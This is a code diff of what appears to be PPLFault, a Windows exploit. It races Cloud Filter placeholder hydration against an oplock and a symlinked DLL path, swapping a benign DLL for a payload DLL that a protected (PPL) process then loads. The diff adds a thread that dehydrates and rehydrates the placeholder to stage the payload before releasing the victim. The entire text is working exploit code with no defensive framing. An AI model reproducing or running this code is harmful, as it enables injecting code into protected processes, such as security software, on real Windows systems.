@@ -28,7 +28,6 @@ HANDLE hOplockEvent = NULL;
 #define PLACEHOLDER_DLL_DIR L"C:\\PPLFaultTemp\\"
 #define PLACEHOLDER_DLL_BASENAME L"EventAggregationPH.dll"
 #define PLACEHOLDER_DLL_PATH PLACEHOLDER_DLL_DIR  PLACEHOLDER_DLL_BASENAME
-#define PLACEHOLDER_DLL_PATH_SMB L"\\\\127.0.0.1\\C$\\PPLFaultTemp\\" PLACEHOLDER_DLL_BASENAME
 #define PAYLOAD_DLL_PATH L"C:\\PPLFaultTemp\\PPLFaultPayload.dll"
 
 // Empties working set
@@ -78,8 +77,8 @@ bool AcquireOplock()
     OVERLAPPED ovl = { NULL, };
 
     hFile = CreateFileW(
-        gpOplockFile, FILE_READ_ATTRIBUTES, 
-        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, 
+        gpOplockFile, FILE_READ_ATTRIBUTES,
+        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
         NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);
     if (INVALID_HANDLE_VALUE == hFile)
     {
@@ -105,7 +104,7 @@ bool AcquireOplock()
     }
 
     PrintDebug(L"Acquired exclusive oplock to file: %ws\n", gpOplockFile);
-    
+
     hOplockFile = hFile;
     hOplockEvent = ovl.hEvent;
 
@@ -120,6 +119,59 @@ void ReleaseOplock()
     hOplockEvent = NULL;
 }
 
+void WaitForOplockBreak()
+{
+    WaitForSingleObject(hOplockEvent, 10000);
+}
+
+DWORD WINAPI PayloadDeliveryThread(void *)
+{
+    HRESULT hRet = NULL;
+    LARGE_INTEGER fileSize{};
+    const wchar_t* pPath = PLACEHOLDER_DLL_PATH;
+
+    WaitForOplockBreak();
+
+    HANDLE hFile = CreateFileW(pPath, DELETE | GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_FLAG_NO_BUFFERING, NULL);
+    if (INVALID_HANDLE_VALUE == hFile)
+    {
+        PrintVerbose(L"PayloadDeliveryThread: CreateFile failed with GLE %u", GetLastError());
+        hRet = HRESULT_FROM_WIN32(GetLastError());
+        goto Cleanup;
+    }
+
+    GetFileSizeEx(hFile, &fileSize);
+
+    PrintDebug(L"About to dehydrate file: %ws", pPath);
+
+    hRet = CfDehydratePlaceholder(hFile, { 0, 0 }, fileSize, CF_DEHYDRATE_FLAG_NONE, 0);
+    if (!SUCCEEDED(hRet))
+    {
+        _com_error err(hRet);
+        PrintVerbose(L"CfDehydratePlaceholder failed with HR 0x%08x: %ws", hRet, err.ErrorMessage());
+        goto Cleanup;
+    }
+
+    PrintDebug(L"About to REhydrate file: %ws", pPath);
+
+    hRet = CfHydratePlaceholder(hFile, { 0, 0 }, fileSize, CF_HYDRATE_FLAG_NONE, NULL);
+    if (!SUCCEEDED(hRet))
+    {
+        _com_error err(hRet);
+        PrintVerbose(L"CfDehydratePlaceholder failed with HR 0x%08x: %ws", hRet, err.ErrorMessage());
+        goto Cleanup;
+    }
+
+    PrintDebug(L"Successfully hydrated file: %ws", pPath);
+
+    // With the payload staged, release the oplock to allow the victim to execute
+    ReleaseOplock();
+
+Cleanup:
+    CloseHandle(hFile);
+    return hRet;
+}
+
 // This is our CloudFilter rehydration callback
 VOID CALLBACK FetchDataCallback (
     _In_ CONST CF_CALLBACK_INFO* CallbackInfo,
@@ -132,6 +184,7 @@ VOID CALLBACK FetchDataCallback (
     HRESULT hRet = S_OK;
 
     static SRWLOCK sFetchDataCallback = SRWLOCK_INIT;
+	const LONGLONG readLength = CallbackParameters->FetchData.RequiredLength.QuadPart;
 
     PrintDebug(L"FetchDataCallback called.\n");
 
@@ -140,7 +193,7 @@ VOID CALLBACK FetchDataCallback (
 
     // Read the current file's contents at requested offset into a local buffer
     // This could be either the benign file, or the payload file
-    buf.resize(CallbackParameters->FetchData.RequiredLength.QuadPart);
+    buf.resize(readLength);
     if (!SetFilePointerEx(hCurrentFile, CallbackParameters->FetchData.RequiredFileOffset, NULL, FILE_BEGIN))
     {
         ntStatus = NTSTATUS_FROM_WIN32(GetLastError());
@@ -165,8 +218,8 @@ VOID CALLBACK FetchDataCallback (
     opParams.TransferData.Buffer = &buf[0];
     opParams.TransferData.Offset = CallbackParameters->FetchData.RequiredFileOffset;
     opParams.TransferData.Length.QuadPart = bytesRead;
-    
-    PrintDebug(L"Hydrating %llu bytes at offset %llu\n", 
+
+    PrintDebug(L"Hydrating %llu bytes at offset %llu\n",
         opParams.TransferData.Length.QuadPart,
         opParams.TransferData.Offset.QuadPart);
 
@@ -178,7 +231,7 @@ VOID CALLBACK FetchDataCallback (
 
     // Once the benign file has been fully read once, switch over to the payload
     if ((hCurrentFile == hBenignFile) &&
-        ((CallbackParameters->FetchData.RequiredFileOffset.QuadPart + CallbackParameters->FetchData.RequiredLength.QuadPart) >=
+        ((CallbackParameters->FetchData.RequiredFileOffset.QuadPart + readLength) >=
             gBenignFileAttributes.nFileSizeLow))
 
     {
@@ -188,40 +241,11 @@ VOID CALLBACK FetchDataCallback (
         PrintDebug(L"Emptying system working set\n");
         EmptySystemWorkingSet();
 
-        //PrintDebug(L"Give the memory manager a moment to think\n");
-        //Sleep(100);
+        PrintDebug(L"Give the memory manager a moment to think\n");
+        Sleep(100);
 
-        buf.clear();
-        buf.resize(gBenignFileAttributes.nFileSizeLow);
-
-        if (!SetFilePointerEx(hCurrentFile, { 0,0 }, NULL, FILE_BEGIN))
-        {
-            ntStatus = NTSTATUS_FROM_WIN32(GetLastError());
-            PrintVerbose(L"SetFilePointerEx failed with GLE %u\n", GetLastError());
-        }
-
-        if (!ReadFile(hCurrentFile, &buf[0], (DWORD)buf.size(), &bytesRead, NULL))
-        {
-            ntStatus = NTSTATUS_FROM_WIN32(GetLastError());
-            PrintVerbose(L"ReadFile failed with GLE %u\n", GetLastError());
-        }
-
-        opParams.TransferData.Buffer = &buf[0];
-        opParams.TransferData.Offset = { 0, 0 };
-        opParams.TransferData.Length.QuadPart = bytesRead;
-
-        PrintDebug(L"Hydrating %llu PAYLOAD bytes at offset %llu\n",
-            opParams.TransferData.Length.QuadPart,
-            opParams.TransferData.Offset.QuadPart);
-
-        hRet = CfExecute(&opInfo, &opParams);
-        if (!SUCCEEDED(hRet))
-        {
-            PrintVerbose(L"CfExecute failed with HR 0x%08x GLE %u\n", hRet, GetLastError());
-        }
-
-        // With the payload staged, release the oplock to allow the victim to execute
-        ReleaseOplock();
+        CloseHandle(CreateThread(NULL, 0, PayloadDeliveryThread, NULL, 0, NULL));
+        Sleep(500);
     }
 
     ReleaseSRWLockExclusive(&sFetchDataCallback);
@@ -253,12 +277,12 @@ bool MoveFileWithPrivilege(const std::wstring& src, const std::wstring& dest)
     }
 
     hFile = CreateFileW(
-        src.c_str(), 
-        SYNCHRONIZE | DELETE, 
-        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, 
-        NULL, 
-        OPEN_EXISTING, 
-        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OPEN_REPARSE_POINT | FILE_FLAG_BACKUP_SEMANTICS, 
+        src.c_str(),
+        SYNCHRONIZE | DELETE,
+        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
+        NULL,
+        OPEN_EXISTING,
+        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OPEN_REPARSE_POINT | FILE_FLAG_BACKUP_SEMANTICS,
         NULL);
     if (INVALID_HANDLE_VALUE == hFile)
     {
@@ -293,7 +317,7 @@ bool FileExists(const std::wstring& path)
     return (INVALID_FILE_ATTRIBUTES != GetFileAttributesW(path.c_str()));
 }
 
-// Replace HIJACK_DLL_PATH symlink to PLACEHOLDER_DLL_PATH_SMB
+// Replace HIJACK_DLL_PATH symlink to PLACEHOLDER_DLL_PATH
 bool InstallSymlink()
 {
     // Make sure PLACEHOLDER exists
@@ -302,16 +326,16 @@ bool InstallSymlink()
         PrintVerbose(L"InstallSymlink: Placeholder does not exist.  Refusing to install symlink.  GLE: %u\n", GetLastError());
         return false;
     }
-    
+
     // Move HIJACK => BACKUP
     if (!MoveFileWithPrivilege(HIJACK_DLL_PATH, HIJACK_DLL_PATH_BACKUP))
     {
         PrintVerbose(L"InstallSymlink: MoveFileExW failed with GLE: %u\n", GetLastError());
         return false;
     }
-    
+
     // Symlink HIJACK => PLACEHOLDER over SMB
-    if (!CreateSymbolicLinkW(HIJACK_DLL_PATH, PLACEHOLDER_DLL_PATH_SMB, 0))
+    if (!CreateSymbolicLinkW(HIJACK_DLL_PATH, PLACEHOLDER_DLL_PATH, 0))
     {
         PrintVerbose(L"InstallSymlink: CreateSymbolicLinkW failed with GLE: %u\n", GetLastError());
         return false;
@@ -342,7 +366,7 @@ bool CleanupSymlink()
         PrintVerbose(L"InstallSymlink: MoveFileExW failed with GLE: %u\n", GetLastError());
         return false;
     }
-    
+
     return true;
 }
 
@@ -416,7 +440,7 @@ bool SpawnPPL()
 	RevertToSelf();
 
     PrintDebug(L"SpawnPPL: Waiting for child process to finish.\n");
-    
+
     dwResult = WaitForSingleObject(pi.hProcess, 5 * 1000);
     if (WAIT_OBJECT_0 != dwResult)
     {
@@ -451,7 +475,7 @@ int PPLFault(_In_ DWORD dwTargetProcessId, _In_ LPWSTR pwszDllPath)
     ULONGLONG startTime = GetTickCount64();
     ULONGLONG endTime = 0;
 	std::string payloadBuf;
-   
+
     if (!IsValidPID(dwTargetProcessId))
     {
         PrintVerbose(L"This doesn't appear to be a valid PID: %u\n", dwTargetProcessId);
@@ -594,7 +618,7 @@ Cleanup:
     //Sleep(100);
     CfUnregisterSyncRoot(PLACEHOLDER_DLL_DIR);
     CleanupSymlink();
-    
+
 	endTime = GetTickCount64();
 	PrintDebug(L"Operation took %u ms", endTime - startTime);
 
